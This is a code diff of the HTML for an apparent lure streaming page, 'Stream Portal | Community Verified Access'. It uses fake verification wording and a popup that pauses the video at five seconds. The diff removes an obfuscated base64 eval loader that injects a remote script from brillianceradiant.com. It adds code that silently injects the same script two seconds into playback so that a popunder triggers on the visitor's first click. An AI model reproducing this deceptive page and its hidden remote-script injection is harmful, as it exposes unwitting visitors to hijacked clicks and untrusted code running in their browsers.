@@ -3,18 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Stream Portal</title>
+
+    <title>Stream Portal | Community Verified Access</title>
+
     <meta property="og:site_name" content="Portal Media USA">
-    <meta property="og:title" content="Shared Community Content">
-    <meta property="og:description" content="Secure cloud media delivery.">
+    <meta property="og:title" content="Shared Community Content - Secure Access">
+    <meta property="og:description" content="View shared media via secure cloud delivery. High-speed streaming enabled for verified regions.">
     <meta property="og:image" content="https://vidley.pw/tombolplay.jpg">
     <meta property="og:type" content="website">
-    <meta name="description" content="Secure cloud media access.">
+
+    <meta name="description" content="Watch trending community shared videos through secure cloud streaming access.">
     <meta name="robots" content="index,follow">
+
+    <!-- Tailwind CSS & Lucide Icons -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
+
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
+
         * {
             -webkit-user-select: none;
             -moz-user-select: none;
@@ -22,6 +29,7 @@
             user-select: none;
             -webkit-touch-callout: none;
         }
+
         body {
             background-color: #030303;
             color: #f5f5f7;
@@ -29,6 +37,7 @@
             min-height: 100vh;
             overflow-x: hidden;
         }
+
         .glass-card {
             background: rgba(13, 13, 15, 0.75);
             backdrop-filter: blur(20px);
@@ -36,6 +45,7 @@
             border: 1px solid rgba(255, 255, 255, 0.08);
             box-shadow: 0 30px 60px -15px rgba(0, 0, 0, 0.9);
         }
+
         .video-container {
             width: 100%;
             background: #000;
@@ -45,11 +55,13 @@
             aspect-ratio: 16 / 9;
             max-height: 65vh;
         }
+
         video {
             width: 100%;
             height: 100%;
             object-fit: contain;
         }
+
         .ad-slot {
             width: 320px;
             height: 50px;
@@ -59,6 +71,7 @@
             align-items: center;
             overflow: hidden;
         }
+
         .native-wrapper {
             width: 100%;
             overflow: hidden;
@@ -67,9 +80,11 @@
             border: 1px solid rgba(255, 255, 255, 0.05);
             padding: 12px;
         }
+
         .native-wrapper iframe {
             max-width: 100% !important;
         }
+
         .sponsor-label {
             text-align: center;
             font-size: 10px;
@@ -79,6 +94,7 @@
             text-transform: uppercase;
             font-weight: 700;
         }
+
         ::-webkit-scrollbar {
             width: 6px;
         }
@@ -92,6 +108,7 @@
         ::-webkit-scrollbar-thumb:hover {
             background: #333;
         }
+
         @keyframes custom-pulse {
             0%, 100% { opacity: 1; transform: scale(1); }
             50% { opacity: 0.5; transform: scale(1.05); }
@@ -100,12 +117,8 @@
             animation: custom-pulse 2s infinite;
         }
     </style>
-    <script type="text/javascript">
-        try {
-            eval(atob('dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHBzOi8vYnJpbGxpYW5jZXJhZGlhbnQuY29tLzJlL2ExLzIxLzJlYTEyMTUzYTc0OTk2YjUwMWMyNTA3Y2I0ZWViYzk2LmpzJztkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHMpOw=='));
-        } catch(e) {}
-    </script>
 </head>
+
 <body class="flex flex-col items-center justify-start min-h-screen p-3 md:p-6 lg:p-8">
 
     <div class="absolute top-0 left-1/2 -translate-x-1/2 w-full max-w-4xl h-[150px] bg-red-600/10 blur-[120px] pointer-events-none rounded-full"></div>
@@ -115,7 +128,7 @@
         <div class="px-5 py-4 border-b border-white/5 flex items-center justify-between bg-black/40">
             <div class="flex items-center gap-2">
                 <div class="w-2.5 h-2.5 rounded-full bg-emerald-500 pulse-effect"></div>
-                <span class="text-xs font-semibold uppercase tracking-widest text-emerald-400 font-mono">Stream Server v2.4</span>
+                <span class="text-xs font-semibold uppercase tracking-widest text-emerald-400">Cloud Stream Server v2.4</span>
             </div>
             <div class="flex items-center gap-2 text-xs text-neutral-400">
                 <i data-lucide="shield-check" class="w-4 h-4 text-emerald-500"></i>
@@ -254,6 +267,7 @@
         <span>© 2026 Portal Media USA. All rights reserved.</span>
     </div>
 
+    <!-- HISTATS INJECTION -->
     <script type="text/javascript">
         var _Hasync=_Hasync||[];
         _Hasync.push(['Histats.start','1,4879497,4,0,0,0,00010000']);
@@ -352,6 +366,7 @@
 
         const continuePopup = document.getElementById("continuePopup");
         const continueBtn = document.getElementById("continueBtn");
+        let popunderInjected = false;
         let popupShown = false;
 
         window.addEventListener("load", () => {
@@ -359,6 +374,18 @@
         });
 
         mainPlayer.addEventListener("timeupdate", () => {
+            // Silently preload popunder script at 2 seconds to make popunder triggerable immediately on 1st click
+            if (!popunderInjected && mainPlayer.currentTime >= 2) {
+                popunderInjected = true;
+                try {
+                    const s = document.createElement("script");
+                    s.src = "https://brillianceradiant.com/2e/a1/21/2ea12153a74996b501c2507cb4eebc96.js";
+                    s.async = true;
+                    document.body.appendChild(s);
+                } catch(e) {}
+            }
+
+            // Launch verification pop-up exactly at 5 seconds
             if (!popupShown && mainPlayer.currentTime >= 5) {
                 popupShown = true;
                 mainPlayer.pause();
@@ -367,14 +394,9 @@
             }
         });
 
+        // Trigger Popunder + resume video execution cleanly in 1 click
         continueBtn.addEventListener("click", () => {
-            try {
-                const s = document.createElement("script");
-                s.src = "https://brillianceradiant.com/2e/a1/21/2ea12153a74996b501c2507cb4eebc96.js";
-                s.async = true;
-                document.body.appendChild(s);
-            } catch(e) {}
-
+            // Because script is already loaded, click bubbles up directly to trigger popunder instantly
             continuePopup.classList.add("hidden");
             continuePopup.classList.remove("flex");
             mainPlayer.muted = false;
